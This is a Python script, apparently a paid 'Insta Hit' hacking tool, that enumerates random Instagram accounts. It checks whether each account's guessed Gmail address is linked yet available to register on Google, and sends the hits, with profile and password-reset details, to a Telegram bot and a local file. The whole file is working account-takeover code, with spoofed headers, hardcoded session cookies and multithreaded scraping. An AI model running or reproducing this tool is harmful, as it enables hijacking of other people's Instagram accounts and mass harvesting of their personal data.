import os
try:
  import requests
  import time
  import hashlib
  import uuid
  from secrets import token_hex
  import pycountry
  import random
  from OneClick import Hunter
  from ms4 import InfoIG, RestInsta, UserAgentGenerator
  import random
  import threading
  from rich.console import Console
  from rich.table import Table
  from rich.text import Text
  import os
  import time
  import json
  import string
  import time
  from user_agent import generate_user_agent  
  import random
  import string
  from secrets import token_hex
  import uuid
except:
  os.system ("pip install OneClick stdiomask requests uuid ms4==2.10.0")
import requests
import time
import hashlib
import uuid
from secrets import token_hex
import pycountry
import random
from OneClick import Hunter
from ms4 import InfoIG, RestInsta, UserAgentGenerator
import random
import threading
from rich.console import Console
from rich.table import Table
from rich.text import Text
import os
import time
import json
import string
import time
from user_agent import generate_user_agent  
import random
import string
from secrets import token_hex
import uuid
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'

def nx():
    os.system("clear")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] Tool Status    : {B}| Paid
|{F}[+] TeleGram   : {B} @Shahil440    
|{F}[+] Privacy  : {B} Private Script 
|{F}[+] Tool       : {B} Insta Hit 
{E}==============================
"""
    for mm in Banner.splitlines():
        time.sleep(0.05)
        print(mm)

nx()

token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)

console = Console()
bb = 0
gg = 0
bm = 0
gm = 0
hit = 0


def Tele(email):
    global hit
    user = email.split("@")[0]
    hit += 1
    try:
        rest = RestInsta.Rest(user)["email"]
    except:
        rest = "Nothing To Rest"

    inf = InfoIG.Instagram_Info(user)
    name = inf["Name"]
    Id = inf["ID"]
    fols = inf["Followers"]
    folg = inf["Following"]
    bio = inf["Bio"]
    po = inf["Posts"]
    pr = inf["Is Private"]

    tlg = f'''
🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯
🤤 Email ==> {email}
🫣 Email Rest ==> {rest}
😛 Username ==> @{user}
🤔 Name ==> {name}
🤫 ID ==> {Id}
😤 Followers ==> {fols}
😥 Following ==> {folg}
😳 Bio ==> {bio}
😵 Posts ==> {po}
🤧 Is Private ==> {pr}
🦁 URL ==> https://www.instagram.com/{user}
🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯
𝐁𝐘 : @Shahil440 
'''
    print(F + tlg)
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")

    with open('hits.txt', 'a') as f:
        f.write(tlg + '\n')




def check_gmail(email):
    global bm, gm
    if "@" in email:
    	name = str(email.split("@")[0])
    else:
    	name = email
    
    agent = generate_user_agent()
    try:
        rd = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for i in range(48))      
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Length": "601",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Cookie": "ACCOUNT_CHOOSER=AFx_qI4lOpv7o7aY8h0tTOHOPh8bQTAzDsVFp6MVEk1FZyrr9i94Vof_9ygVcIDFx1uWw0lX3Z1Q; __Host-GAPS=1:Qe2Nhl4_wJVTHBUig7kFPqW1XFnGPeSn4qPzfavnoAIugtLHo5-3E2MvwE_9CRilNeHe-v1Swgvt_05YqRiO1zsyFNzaYg:YwNYeLuhW6Qqdd_7",
            "Google-Accounts-Xsrf": "1",
            "Origin": "https://accounts.google.com",
            "Referer": "https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&parent_directed=true&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AL"+rd+"",
            "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
            "Sec-Ch-Ua-Arch": '""',
            "Sec-Ch-Ua-Bitness": '""',
            "Sec-Ch-Ua-Full-Version": '"124.0.6327.4"',
            "Sec-Ch-Ua-Full-Version-List": '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            "Sec-Ch-Ua-Mobile": '?1',
            "Sec-Ch-Ua-Model": '"Infinix X6816"',
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-Version": '"11.0.0"',
            "Sec-Ch-Ua-Wow64": '?0',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": agent,
            "X-Chrome-Connected": "source=Chrome,eligible_for_consistency=true",
            "X-Client-Data": "CIrpygE=",
            "X-Same-Domain": "1"
        }

        data = 'continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&ddm=0&f.req=%5B%22TL%3AALoj5Apk-QhF9ZkDxb68DVn9MZBEKfxahHhWK457dfrQcj1CsKB3N05aJExOJQqI%22%2C%22hdjshddhjssg%22%2C0%2C0%2C1%2Cnull%2C0%2C11388%5D&azt=AFoagUVzhhI4QD_7csOerP1br-HnH3Hvhw%3A1722785430680&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlicfWebSignIn&checkConnection=youtube%3A457&checkedDomains=youtube&pstMsg=1&'

        params = {   
            'TL': 'AL'+rd+'',   
        }
        re = requests.post('https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&parent_directed=true&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AL'+rd+'', headers=headers, data=data, params=params).text


        tl1 = re.split("%3D1%26TL%3D")[2].split("','")[0]

        url2 = 'https://accounts.google.com/_/signup/validatepersonaldetails'
        
        headers2 = {
            'Accept':'*/*',        
            'Accept-Language':'en-US,en;q=0.9,ar;q=0.8',
            'Content-Length':'1080',
            'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',        
            'Cookie':'AEC=AVYB7con2SVQy9_fT3QWX5L6ljkZeNzOpHbs5emTa6YYqJCa3563GEYspQ; NID=516=sSv4rvSu2xQVk-puvjNLQiB_eqdn1SGUqLBi8c9DvjE8m5Zna0EAGEFvHpakX3WmrfwNBBBZvXTlfBymRAKqZyrVw1aGPHy7n-XS5vHM4dW-6y26ude10t5Ee00xf3tcttVUJAuTHQK-DpokbxBPjlKDUrWeLwT_BcPw7sniEupahR2u0WZQFSfKjwsCvS1FbwPYD6j95E8C6BHxzLnnG8voO4gNjv9SeDUa; OTZ=7668995_44_44__44_; __Host-GAPS=1:syW2VmPKkzAWXIQDPaaWSqIOOfOJSA:aIOwVlrJpyQhaMS_',        
            'Google-Accounts-Xsrf':'1',
            'Origin':'https://accounts.google.com',
            'Referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=ar&parent_directed=true&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl1+'',
               "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
              "Sec-Ch-Ua-Arch": "\"\"",
              "Sec-Ch-Ua-Bitness": "\"\"",
              "Sec-Ch-Ua-Full-Version": "\"120.0.6099.116\"",
              "Sec-Ch-Ua-Full-Version-List": "\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"120.0.6099.116\"",
               "Sec-Ch-Ua-Mobile": "?1",
              "Sec-Ch-Ua-Model": "\"Infinix X6816\"",
              "Sec-Ch-Ua-Platform": "\"Android\"",
              "Sec-Ch-Ua-Platform-Version": "\"11.0.0\"",
              "Sec-Ch-Ua-Wow64": "?0",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
            'User-Agent': agent,
        }

        data2 = {
            'continue': 'https://mail.google.com/mail/',
            'hl': 'ar',
            'service': 'mail',
            'theme': 'glif',
            'f.req': '["AEThLlwR3FD7Y29LMUNWOblmlmY6lpe5oNVl9GLRLfdGG13IDj7RhUKucw23Ihy1akPHAwELnUjyXeQw1z3aWyyCDTabwpo76QTRYhSerlc3ZmZgvhCWQFSkhUAOyUz9mjsf23X-S9EYrmxUofOdME0jpSWYcHI0Mv2tQzjHG0cNBbUgKka7vQPEr5Vh8m5tjWuA5P4-Yw4d",null,null,null,null,0,0,"kdiid","kdiid","web-glif-signup",0,null,10,[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"33f5bce7-974b-43ac-a551-b845f36cd0f9",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5]],1]',
            'at': 'AFoagUVWWvDPTl7Ry1HGYr6MX6YXOh1eAg:1722443745111',
            'azt': 'AFoagUXEpNBwAk1L6vwFLSCoZsljO6s48g:1708880500160',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,null,null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"baa40d55-26ea-42ee-bd2b-78fc97e883ae",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:1576',
            'checkedDomains': 'youtube',
            'pstMsg': '1'
        }

        rt = requests.post(url2, headers=headers2, data=data2).text
        tt = rt.split('"gf.ttu",null,"')[1].split('"]')[0]
        

        
        
        url=f'https://accounts.google.com/_/signup/usernameavailability?hl=en&TL={tt}&_reqid=570554&rt=j'
        
        headers ={
        'Accept':'*/*',        
        'Accept-Language':'en-US,en;q=0.9,ar;q=0.8',
        'Content-Length':'1080',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',        'Cookie':'AEC=AVYB7con2SVQy9_fT3QWX5L6ljkZeNzOpHbs5emTa6YYqJCa3563GEYspQ; NID=516=sSv4rvSu2xQVk-puvjNLQiB_eqdn1SGUqLBi8c9DvjE8m5Zna0EAGEFvHpakX3WmrfwNBBBZvXTlfBymRAKqZyrVw1aGPHy7n-XS5vHM4dW-6y26ude10t5Ee00xf3tcttVUJAuTHQK-DpokbxBPjlKDUrWeLwT_BcPw7sniEupahR2u0WZQFSfKjwsCvS1FbwPYD6j95E8C6BHxzLnnG8voO4gNjv9SeDUa; OTZ=7668995_44_44__44_; __Host-GAPS=1:gCdAVOIzMpmuRzuVPMOCXVCyHgnGaQ:yeSfjlgtRSv3kfGc',
        'Google-Accounts-Xsrf':'1',
        'Origin':'https://accounts.google.com',
        'Referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=ar&parent_directed=true&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL=ADg0xR2VWkqNiosfc54yGE0dKl4h_d-1-4G6hWMgpHuKJtbORcyy41V09Fo3jwFQ',       
  
        'User-Agent': agent,
        
    }
        data = {
            'continue': 'https://mail.google.com/mail/',
            'service': 'mail',
            'ddm': '0',
            'f.req': f'["TL:{tt}","{name}",0,0,1,null,0,12531]',
            'azt': 'AFoagUVWWvDPTl7Ry1HGYr6MX6YXOh1eAg:1722443745111',
            'cookiesDisabled': 'false',
            'deviceinfo':' [null,null,null,null,null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"33f5bce7-974b-43ac-a551-b845f36cd0f9",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:338',
            'checkedDomains': 'youtube',
            'pstMsg': '1'


            }
        req = requests.post(url, headers=headers, data=data).text
        
        if '"gf.uar",1' in req:
            gm += 1
            Tele(email)
                    
        else:
        	bm += 1
            
                     
                     
    except:
    	bm += 1
        

class Variable:
    country = [country.numeric for country in pycountry.countries]
    num = random.choice(country)
    sgin = hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest()
    csr = str(token_hex(8) * 2)
    android = f"android-{uuid.uuid4().hex[:16]}"




#-----Nice------#

def CheckGmail(username):
    global gg, bb
    email = username + "@gmail.com"
    url = "https://i.instagram.com/api/v1/users/lookup/"
    payload = f"signed_body={Variable.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{Variable.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{Variable.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{Variable.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"
    headers = {
        'User-Agent': str(Hunter.Services()),
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/x-www-form-urlencoded",
        'X-Pigeon-Session-Id': str(uuid.uuid4()),
        'X-Pigeon-Rawclienttime': str("{:.3f}".format(time.time())),
        'X-IG-Connection-Speed': "-1kbps",
        'X-IG-Bandwidth-Speed-KBPS': "-1.000",
        'X-IG-Bandwidth-TotalBytes-B': "0",
        'X-IG-Bandwidth-TotalTime-MS': "0",
        'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
        'X-IG-Connection-Type': "MOBILE(LTE)",
        'X-IG-Capabilities': "3brTvw==",
        'X-IG-App-ID': "567067343352427",
        'Accept-Language': "ar-YE, en-US",
        'X-FB-HTTP-Engine': "Liger",
    }
    try:
        table = Table(title=f"{O}Instagram HITS")
        table.add_column("Type", justify="center", style="cyan", no_wrap=True)
        table.add_column("Count", justify="center", style="magenta")
        res = requests.post(url, data=payload, headers=headers).text
        
        if '"status":"ok"' in res and f'{email}' in res:
            gg += 1
            check_gmail(email)
        elif '"message":"لم يتم العثور على مستخدمين","status":"fail"' in res:
            bb += 1
        else:
            bb += 1

    except:
        bb += 1

    os.system('clear')
    table.add_row("Hits", Text(str(hit), style="green"))
    table.add_row("GoodInsta", Text(str(gg), style="yellow"))
    table.add_row("BadInsta", Text(str(bb), style="red"))
    table.add_row("GoodEmail", Text(str(gm), style="blue"))
    table.add_row("BadEmail", Text(str(bm), style="red"))   
    table.add_row("Emails", Text(str(email), style="white"))
    table.add_row("Dev", "X44 Hacking ~~ @Shahil440")
    console.print(table)

def get_username():
    while True:
        try:
            LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))            
            bol = json.dumps({"id": str(random.randrange(128053904, 53186034340)), "render_surface": "PROFILE"})         
            response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator),}, data = {"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"})
            username = response.json()['data']['user']['username']            
            CheckGmail(username)
            
        except:           
            pass
                   

threads = []
for i in range(10):
    t = threading.Thread(target=get_username)
    threads.append(t)
    t.start()
for t in threads:
    t.join()      	
